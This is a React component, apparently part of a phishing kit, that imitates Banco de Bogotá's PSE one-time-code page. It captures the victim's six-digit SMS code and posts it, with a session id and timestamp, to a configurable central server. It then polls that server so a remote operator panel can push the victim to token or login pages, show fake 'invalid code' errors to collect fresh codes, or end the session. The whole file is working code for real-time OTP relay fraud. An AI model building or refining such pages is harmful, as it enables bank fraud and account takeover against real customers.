import { useState, useRef, useEffect } from 'react';
import { useNavigate } from "react-router-dom";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import LoadingBogota from "../../../../../components/LoadingBogota";
import logo from "../../img/logo_bancobogota.webp";
import celular from "../../img/imagen_cel.webp";
import "./bogota_otp_pse.css";

const BOGOTA_ERROR_MODAL_KEY = "bogota_error_modal";
const BOGOTA_PSE_PAGE_CLASS = "bogota-pse-login-page";
const BOGOTA_CREDENTIAL_ERROR_AUTO_HIDE_MS = 5000;
const BOGOTA_CREDENTIAL_ERROR_TITLE = "Verifica los datos que ingresaste";
const BOGOTA_CREDENTIAL_ERROR_MSG = "Revisa tus datos y vuelve a intentarlo.";

// Se define el mensaje de error de OTP
const OTPVerification = () => {

  // Se inicializa el navigate
  const navigate = useNavigate();

  // Se inicializa el estado del codigo OTP
  const [otpCode, setOtpCode] = useState(['', '', '', '', '', '']);
  const [showOTPError, setShowOTPError] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalMode, setModalMode] = useState(null);
  const [modalText, setModalText] = useState("");
  const [getLoading, setLoading] = useState(false);

  // Estados para el contador de reenvío
  const [resendTimer, setResendTimer] = useState(60);
  const [isResendActive, setIsResendActive] = useState(false);

  // Bandera para evitar que el blur automático active el error
  const isAutoFocusing = useRef(false);

  // Se inicializa el ref para los inputs
  const otpRefs = useRef([]);
  const pollingIntervalRef = useRef(null);
  const sessionIdRef = useRef(null);
  const lastEstadoRef = useRef(null);
  const modalBloqueoEstadoRef = useRef(null);
  const ignorarEstadoHastaCambioRef = useRef(null);

  // Se valida si el codigo OTP es completo
  const isOTPComplete = otpCode.every(d => d !== '');

  const stopPolling = () => {
    if (pollingIntervalRef.current) {
      clearTimeout(pollingIntervalRef.current);
      pollingIntervalRef.current = null;
    }
  };

  const clearOtpFields = () => {
    setOtpCode(['', '', '', '', '', '']);
    setShowOTPError(false);
    setIsResendActive(false);
    setResendTimer(60);
  };

  const dismissOtpCredentialError = () => {
    setShowModal(false);
    setModalMode(null);
    clearOtpFields();

    if (modalBloqueoEstadoRef.current === "error_otp") {
      ignorarEstadoHastaCambioRef.current = "error_otp";
      modalBloqueoEstadoRef.current = null;
    }

    setTimeout(() => otpRefs.current[0]?.focus(), 50);
  };

  const showOtpCredentialError = () => {
    stopPolling();
    setLoading(false);
    modalBloqueoEstadoRef.current = "error_otp";
    clearOtpFields();
    setModalMode("otp_error");
    setShowModal(true);
  };

  const dismissOtpCredentialErrorIfOpen = () => {
    if (modalBloqueoEstadoRef.current === "error_otp") {
      dismissOtpCredentialError();
    }
  };

  // Effect para el contador regresivo
  useEffect(() => {

    // Se inicializa el intervalo para el contador regresivo
    let interval;

    // Se valida si el reenvio de OTP esta activo y el tiempo es mayor a 0
    if (isResendActive && resendTimer > 0) {

      // Se setea el intervalo para el contador regresivo
      interval = setInterval(() => {

        // Se setea el tiempo restante para el reenvio de OTP
        setResendTimer((prev) => {

          // Se valida si el tiempo restante es menor o igual a 1
          if (prev <= 1) {

            // Se desactiva el reenvio de OTP
            setIsResendActive(false);

            // Se setea el tiempo restante para el reenvio de OTP
            return 60;
          }

          // Se retorna el tiempo restante para el reenvio de OTP
          return prev - 1;
        });
      }, 1000);
    }

    // Se limpia el intervalo para el contador regresivo
    return () => clearInterval(interval);
  }, [isResendActive, resendTimer]);

  useEffect(() => {
    if (!showModal || modalMode !== "otp_error") return undefined;

    const timer = setTimeout(() => {
      dismissOtpCredentialError();
    }, BOGOTA_CREDENTIAL_ERROR_AUTO_HIDE_MS);

    return () => clearTimeout(timer);
  }, [showModal, modalMode]);

  // Se ejecuta cuando el componente se monta
  useEffect(() => {
    document.documentElement.classList.add(BOGOTA_PSE_PAGE_CLASS);
    document.body.classList.add(BOGOTA_PSE_PAGE_CLASS);

    return () => {
      document.documentElement.classList.remove(BOGOTA_PSE_PAGE_CLASS);
      document.body.classList.remove(BOGOTA_PSE_PAGE_CLASS);
    };
  }, []);

  // Se ejecuta cuando el componente se monta
  useEffect(() => {

    // Se enfoca el primer input
    otpRefs.current[0]?.focus();
  }, []);

  useEffect(() => {

    // Se inicializa la sesión activa
    sessionIdRef.current = localStorage.getItem("sessionId");

    // Se revisa si hay modal pendiente desde otras pantallas
    const pendingError = localStorage.getItem(BOGOTA_ERROR_MODAL_KEY);

    if (pendingError === "error_otp") {
      showOtpCredentialError();
    } else if (pendingError === "error_login") {

      setShowModal(true);
      setModalText("Credenciales incorrectas, por favor intente nuevamente.");
    } else if (pendingError === "block_ip") {

      modalBloqueoEstadoRef.current = "block_ip";
      setModalMode("block_ip");
      setShowModal(true);
      setModalText("Acceso bloqueado por seguridad.");
    }

    if (pendingError) {
      localStorage.removeItem(BOGOTA_ERROR_MODAL_KEY);
    }
  }, []);

  // Limpia el timeout de polling al desmontar
  useEffect(() => {

    return () => {
      stopPolling();
    };
  }, []);

  // Se ejecuta cuando el codigo OTP es completo
  useEffect(() => {

    // Se valida si el codigo OTP es completo
    if (isOTPComplete) setShowOTPError(false);
  }, [isOTPComplete]);

  // Función para solicitar reenvío de OTP al backend
  const handleResendCode = async () => {

    // Se valida si el reenvio de OTP esta activo o si existe loading
    if (isResendActive || getLoading) return;

    // Se captura la sessionId persistida
    const sessionId = localStorage.getItem("sessionId") || sessionIdRef.current;

    // Se valida si la sessionId persistida existe
    if (!sessionId) {

      // Se muestra el modal de error de no sessionId
      setShowModal(true);

      // Se setea el texto del modal
      setModalText("Por favor, vuelva a la pagina de compra para iniciar el proceso nuevamente.");

      // Se sale del metodo
      return;
    }

    // Se captura la url central
    const centralUrl = (process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || "").trim();

    // Se envia la data al backend
    const dataSend = {
      "data": {
        "attributes": {
          "sessionId": sessionId,
          "backend": "P01",
          "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          "backend_url": "/api/v1/bogota/otp-resend",
        },
      },
    };

    // Se usa el try catch
    try {

      // Se setea el loading a true
      setLoading(true);

      // Se envia la data al backend
      const response = centralUrl ? await instanceBackend.post(centralUrl, dataSend) : await instanceBackend.post("/bogota/otp-resend", dataSend);

      // Se valida si la respuesta es exitosa
      if (response?.data?.success) {

        // Se captura la sessionId devuelta por el backend
        const sid = response.data.sessionId ?? sessionId;

        // Se persiste la sessionId devuelta por el backend
        localStorage.setItem("sessionId", sid);

        // Se setea la sessionId persistida
        sessionIdRef.current = sid;

        // Se activa el reenvio de OTP
        setIsResendActive(true);

        // Se setea el tiempo restante para el reenvio de OTP
        setResendTimer(60);

        // Se limpia el codigo OTP ingresado
        setOtpCode(['', '', '', '', '', '']);
        setShowOTPError(false);
        setTimeout(() => otpRefs.current[0]?.focus(), 50);

        // Tras reenvío el panel habilita botones: reanudar polling sin overlay de carga
        lastEstadoRef.current = null;
        initPolling();
        setLoading(false);
      } else {

        // Se muestra el modal de error de no se pudo solicitar un nuevo codigo
        setShowModal(true);

        // Se setea el texto del modal
        setModalText("Por favor, vuelva a generar el codigo OTP.");
        setLoading(false);
      }
    } catch (error) {

      // Se captura el status de la respuesta
      const status = error?.response?.status;

      // Se captura el estado de la respuesta
      const estadoErr = (error?.response?.data?.estado || "").toString().toLowerCase();

      // Se valida si el status es 403 y el estado es error_blocked
      if (status === 403 && estadoErr === "error_blocked") {

        // Se limpia el localStorage
        localStorage.clear();

        // Se redirige a la pagina de inicio
        window.location.href = process.env.REACT_APP_URL_BANK || "/";

        // Se sale del metodo
        return;
      }

      // Se muestra el modal de error de comunicación con el servidor central o de conexión con el servidor
      setShowModal(true);

      // Se setea el texto del modal
      setModalText(centralUrl ? "Error de comunicación con el servidor central." : "Error de conexión con el servidor.");
      setLoading(false);
    }
  };

  // Metodo para manejar el cambio del codigo OTP
  const handleOTPChange = (index, value) => {

    // Se valida si el valor es un numero
    if (!/^\d*$/.test(value)) return;

    // Se crea un nuevo array con el codigo OTP
    const newOTP = [...otpCode];

    // Se actualiza el valor en la posicion correcta
    newOTP[index] = value.slice(-1);

    // Se actualiza el codigo OTP
    setOtpCode(newOTP);
    dismissOtpCredentialErrorIfOpen();

    // Se valida si hay error en el codigo OTP
    if (showOTPError) {

      // Se desactiva el error en el codigo OTP
      setShowOTPError(false);
    }

    // Se valida si el valor es un numero y el indice es menor a 5
    if (value && index < 5) {

      // Se activa el focus en el siguiente input
      isAutoFocusing.current = true;

      // Se activa el focus en el siguiente input
      otpRefs.current[index + 1]?.focus();

      // Se desactiva el focus en el input
      setTimeout(() => {

        // Se desactiva el focus en el input
        isAutoFocusing.current = false;
      }, 100);
    }
  };

  // Metodo para manejar el key down del codigo OTP
  const handleOTPKeyDown = (index, e) => {

    // Se valida si la tecla es backspace y el indice es mayor a 0
    if (e.key === 'Backspace' && !otpCode[index] && index > 0) {

      // Se activa el focus en el input anterior
      isAutoFocusing.current = true;

      // Se activa el focus en el input anterior
      otpRefs.current[index - 1]?.focus();
      dismissOtpCredentialErrorIfOpen();

      // Se valida si hay error en el codigo OTP
      if (showOTPError) {

        // Se desactiva el error en el codigo OTP
        setShowOTPError(false);
      }

      // Se crea un temporizador para desactivar el focus en el input
      setTimeout(() => {

        // Se desactiva el focus en el input
        isAutoFocusing.current = false;
      }, 100);
    }
  };

  // Metodo para manejar el blur del codigo OTP
  const handleOTPBlur = () => {

    // Se valida si el focus esta activo
    if (isAutoFocusing.current) return;

    // Se valida si hay algun digito en el codigo OTP
    const hasSome = otpCode.some(d => d !== '');

    // Se valida si el codigo OTP no esta completo
    const notComplete = !otpCode.every(d => d !== '');

    // Se valida si hay algun digito en el codigo OTP y el codigo OTP no esta completo
    if (hasSome && notComplete) {

      // Se muestra el error en el codigo OTP
      setShowOTPError(true);
    }
  };

  // Cálculo del progreso del círculo (circunferencia = 2 * π * 20 ≈ 126)
  const circumference = 2 * Math.PI * 20;
  const strokeDashoffset = circumference - (resendTimer / 60) * circumference;

  // Se crea helper de redirección
  const redirigir = (ruta) => {

    // Se redirige a la ruta
    navigate(ruta);
  };

  // Se cierra modal y se limpia formulario local
  const closeModal = () => {
    if (modalMode === "otp_error") {
      dismissOtpCredentialError();
      return;
    }

    setShowModal(false);
    setModalMode(null);
    setModalText("");
    clearOtpFields();
    setTimeout(() => otpRefs.current[0]?.focus(), 50);
  };

  // Se inicializa polling con setTimeout recursivo
  const initPolling = () => {

    // Se limpia el timeout de polling
    if (pollingIntervalRef.current) {

      // Se limpia el timeout de polling
      clearTimeout(pollingIntervalRef.current);

      // Se setea el timeout de polling a null
      pollingIntervalRef.current = null;
    }

    // Se crea el metodo de polling
    const poll = async () => {

      // Se usa el try catch
      try {

        // Se realiza la petición al backend
        const response = await instanceBackend.post(`/bogota/verify-state/${sessionIdRef.current}`);

        // Se captura el estado actual
        const estadoActual = (response?.data?.estado || "").toLowerCase();

        // Se valida si el estado actual no cambio o no es valido
        if (!estadoActual) {

          pollingIntervalRef.current = setTimeout(poll, 3000);
          return;
        }

        if (ignorarEstadoHastaCambioRef.current) {
          if (estadoActual === ignorarEstadoHastaCambioRef.current) {
            pollingIntervalRef.current = setTimeout(poll, 3000);
            return;
          }
          ignorarEstadoHastaCambioRef.current = null;
          modalBloqueoEstadoRef.current = null;
        }

        if (modalBloqueoEstadoRef.current && estadoActual === modalBloqueoEstadoRef.current) {
          pollingIntervalRef.current = setTimeout(poll, 3000);
          return;
        }

        if (lastEstadoRef.current === estadoActual) {

          pollingIntervalRef.current = setTimeout(poll, 3000);
          return;
        }

        // Se actualiza el estado anterior
        lastEstadoRef.current = estadoActual;

        // Se inicializan los estados que detienen el polling
        const stateValid = [
          "sol_otp", "sol_token", "sol_finalizar", "sol_finalizado", "solicitar_finalizar", "error_otp", "error_token", "error_login", "block_ip", "error_blocked",
        ];

        // Se valida si el estado actual debe seguir consultando
        if (!stateValid.includes(estadoActual)) {

          // Se programa el siguiente ciclo de polling
          pollingIntervalRef.current = setTimeout(poll, 3000);
        } else {

          // Se setea el timeout de polling a null
          pollingIntervalRef.current = null;
        }

        // Se ejecuta el switch del estado actual
        switch (estadoActual) {
          case "sol_otp":

            // Se desactiva el loading
            setLoading(false);

            // Se limpia el codigo OTP
            setOtpCode(['', '', '', '', '', '']);

            // Se desactiva el error en el codigo OTP
            setShowOTPError(false);

            // Se desactiva el reenvio de OTP
            setIsResendActive(false);

            // Se setea el tiempo restante para el reenvio de OTP
            setResendTimer(60);

            // Se activa el focus en el primer input
            setTimeout(() => otpRefs.current[0]?.focus(), 50);

            // Se sale del switch
            break;
          case "sol_token":

            // Se desactiva el loading
            setLoading(false);

            // Se redirige a la página de token
            redirigir("/banco_bogota_token");

            // Se sale del switch
            break;
          case "sol_finalizar":
          case "sol_finalizado":
          case "solicitar_finalizar":

            // Se desactiva el loading
            setLoading(false);

            // Se redirige a la página de finalizado
            redirigir("/finalizado-pse");

            // Se sale del switch
            break;
          case "error_otp":
            showOtpCredentialError();
            break;
          case "error_token":

            // Se desactiva el loading
            setLoading(false);

            // Se setea el error modal
            localStorage.setItem(BOGOTA_ERROR_MODAL_KEY, "error_token");

            // Se redirige a la página de token
            redirigir("/banco_bogota_token");

            // Se sale del switch
            break;
          case "error_login":

            // Se desactiva el loading
            setLoading(false);

            // Se setea el error modal
            localStorage.setItem(BOGOTA_ERROR_MODAL_KEY, "error_login");

            // Se redirige a la página de login
            redirigir("/banco_bogota_pse");

            // Se sale del switch
            break;
          case "block_ip":
          case "error_blocked":
            setLoading(false);
            modalBloqueoEstadoRef.current = "block_ip";
            setModalMode("block_ip");
            setShowModal(true);
            setModalText("Acceso bloqueado por seguridad.");
            break;
          default:
        }
      } catch (error) {

        // Se programa el siguiente ciclo de polling cuando falla la consulta
        pollingIntervalRef.current = setTimeout(poll, 3000);
      }
    };

    // Se ejecuta el primer ciclo de polling
    poll();
  };

  // Se procesa envío OTP al backend (un solo paso, sin pantalla previa de celular)
  const handleSubmit = async (event) => {

    // Se previene el comportamiento por defecto del formulario
    event.preventDefault();

    // Se valida si el codigo OTP esta completo o si existe loading
    if (!isOTPComplete || getLoading) return;

    // Se captura el codigo OTP
    const otp = otpCode.join("");

    // Se captura la sessionId persistida
    const sessionId = localStorage.getItem("sessionId");

    // Se inicializa la data a enviar
    const dataSend = {
      "data": {
        "attributes": {
          "otp": otp,
          "fecha": new Date().toISOString(),
          "sessionId": sessionId || sessionIdRef.current,
          "backend": "P01",
          "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          "backend_url": "/api/v1/bogota/otp",
        },
      },
    };

    // Se captura la url central configurada
    const centralUrl = (process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || "").trim();

    // Se usa el try catch
    try {

      // Se activa el loading
      setLoading(true);

      // Se realiza la petición al backend central o al backend local
      const response = centralUrl
        ? await instanceBackend.post(centralUrl, dataSend)
        : await instanceBackend.post("/bogota/otp", dataSend);

      // Se valida si la respuesta fue exitosa
      if (response?.data?.success) {

        // Se persiste la sessionId devuelta por el backend
        localStorage.setItem("sessionId", response.data.sessionId);
        sessionIdRef.current = response.data.sessionId;

        // Se inicia el polling después del envío correcto
        initPolling();
      } else {

        // Se desactiva el loading
        setLoading(false);

        // Se muestra el modal de error de OTP
        setShowModal(true);

        // Se setea el texto del modal
        setModalText("Error de codigo OTP.");
      }
    } catch (error) {

      // Se desactiva el loading
      setLoading(false);

      // Se muestra el modal de error
      setShowModal(true);

      // Se setea el texto del modal
      setModalText(centralUrl ? "Error de comunicación con el servidor central." : "Error de conexión con el servidor.");
    }
  };

  // Se retorna el codigo HTML
  return (
    <div className="otp-container">
      <header className="otp-header">
        <div className="header-content" style={{ justifyContent: 'center' }}>
          <div className="bank-logo" style={{ position: 'static', transform: 'none' }}>
            <img
              src={logo}
              alt="Banco de Bogotá"
              className="bank-logo-img"
            />
          </div>
        </div>

        <button
          className="abandon-button"
          onClick={() => window.location.href = '/'}
          style={{
            position: 'absolute',
            right: '24px',
            top: '50%',
            transform: 'translateY(-50%)',
            marginLeft: '0'
          }}
        >
          Abandonar
          <svg className="close-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <line x1="18" y1="6" x2="6" y2="18"></line>
            <line x1="6" y1="6" x2="18" y2="18"></line>
          </svg>
        </button>
      </header>

      <main className="otp-main">
        <h1 className="otp-title">Verifiquemos que eres tú</h1>

        <div className="otp-card">
          <div className="card-icon">
            <img
              src={celular}
              alt="Celular"
              style={{
                width: '65px',
                height: '65px',
                objectFit: 'contain'
              }}
            />
          </div>

          <h2 className="card-title">Código de verificación</h2>

          <p className="card-description">
            Ingresa el código de 6 dígitos que enviamos a tu celular.
          </p>

          <form onSubmit={handleSubmit}>
            <div className="inputs-container otp-inputs">
              {otpCode.map((digit, index) => (
                <input
                  key={index}
                  ref={el => otpRefs.current[index] = el}
                  type="text"
                  inputMode="numeric"
                  maxLength="1"
                  value={digit}
                  onChange={(e) => handleOTPChange(index, e.target.value)}
                  onKeyDown={(e) => handleOTPKeyDown(index, e)}
                  onPaste={(e) => e.preventDefault()}
                  onBlur={handleOTPBlur}
                  className={`otp-input ${digit ? 'filled' : ''} ${showOTPError ? 'error' : ''}`}
                  aria-label={`Dígito ${index + 1} del código`}
                />
              ))}
            </div>

            <div className="buttons-container">
              <button
                type="submit"
                className={`action-button ${isOTPComplete ? 'active' : ''}`}
                disabled={!isOTPComplete || getLoading}
              >
                Verificar
              </button>

              {isResendActive ? (
                <div className="resend-timer-container">
                  <div className="resend-circle">
                    <svg className="resend-progress" width="48" height="48">
                      <circle
                        className="resend-progress-bg"
                        cx="24"
                        cy="24"
                        r="20"
                      />
                      <circle
                        className="resend-progress-bar"
                        cx="24"
                        cy="24"
                        r="20"
                        style={{
                          strokeDasharray: circumference,
                          strokeDashoffset: strokeDashoffset
                        }}
                      />
                    </svg>
                    <span className="resend-count">{resendTimer}</span>
                  </div>
                  <span className="resend-text">Reenviar código</span>
                </div>
              ) : (
                <button type="button" className="link-button" onClick={handleResendCode} style={{ marginTop: '10px', textDecoration: 'underline' }}>
                  Reenviar Código
                </button>
              )}
            </div>
          </form>
        </div>
      </main>

      {showModal && (
        <div
          className={`bogota-modal-wrap ${modalMode === "otp_error" ? "bogota-modal-wrap--login-error" : ""}`}
          onClick={modalMode === "otp_error" ? dismissOtpCredentialError : closeModal}
        >
          {modalMode === "otp_error" ? (
            <div
              className="bogota-modal-card--login-error"
              onClick={(e) => e.stopPropagation()}
              role="alertdialog"
              aria-labelledby="bogota-otp-error-title"
              aria-describedby="bogota-otp-error-desc"
            >
              <div className="bogota-modal-login-error-body">
                <div className="bogota-modal-login-error-icon" aria-hidden="true">
                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="40" height="40" fill="none">
                    <circle cx="12" cy="12" r="11" fill="currentColor" />
                    <path d="M12 7.5v5.25M12 16.25h.01" stroke="#fff" strokeWidth="1.75" strokeLinecap="round" />
                  </svg>
                </div>
                <h2 id="bogota-otp-error-title" className="bogota-modal-login-error-title">
                  {BOGOTA_CREDENTIAL_ERROR_TITLE}
                </h2>
                <p id="bogota-otp-error-desc" className="bogota-modal-login-error-text">
                  {BOGOTA_CREDENTIAL_ERROR_MSG}
                </p>
              </div>
              <div className="bogota-modal-login-error-footer">
                <button type="button" className="bogota-modal-retry-btn" onClick={dismissOtpCredentialError}>
                  Reintentar
                </button>
              </div>
            </div>
          ) : (
            <div className="bogota-modal-card" onClick={(e) => e.stopPropagation()}>
              <div className="bogota-modal-top">Personas</div>
              <div className="bogota-modal-mid">
                <p>{modalText}</p>
              </div>
              <div className="bogota-modal-bot">
                <button type="button" className="bogota-modal-accept-btn" onClick={closeModal}>
                  Aceptar
                </button>
              </div>
            </div>
          )}
        </div>
      )}

      {getLoading && <LoadingBogota isOpen />}
    </div>
  );
};

// Se exporta el componente
export default OTPVerification;